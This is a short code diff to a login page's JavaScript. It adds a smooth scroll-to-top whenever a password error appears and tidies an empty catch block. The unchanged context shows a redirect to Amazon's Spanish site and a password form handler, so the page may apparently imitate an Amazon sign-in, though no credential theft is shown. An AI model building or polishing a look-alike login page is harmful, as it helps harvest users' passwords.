@@ -4,8 +4,7 @@
       window.location.replace("https://www.amazon.com/-/es/");
       return;
     }
-  } catch {
-  }
+  } catch {}
 
   window.addEventListener("pageshow", (event) => {
     if (event.persisted) window.location.reload();
@@ -39,6 +38,10 @@
       });
     }
 
+    function scrollToTop() {
+      window.scrollTo({ top: 0, left: 0, behavior: "smooth" }); // [web:2]
+    }
+
     passwordInput.addEventListener("input", () => {
       passwordInput.classList.remove("form-input-error");
       if (emptyErrorAlert) emptyErrorAlert.style.display = "none";
@@ -56,6 +59,7 @@
     function showError(msg) {
       if (serverMsgText) serverMsgText.textContent = msg;
       if (authErrorBox) authErrorBox.style.display = "block";
+      scrollToTop(); // subir al tope cuando se muestra error
     }
 
     form.addEventListener("submit", async (e) => {
@@ -72,6 +76,7 @@
         passwordInput.classList.add("form-input-error");
         if (emptyErrorAlert) emptyErrorAlert.style.display = "flex";
         passwordInput.focus();
+        scrollToTop(); // subir al tope también aquí
         return;
       }
 
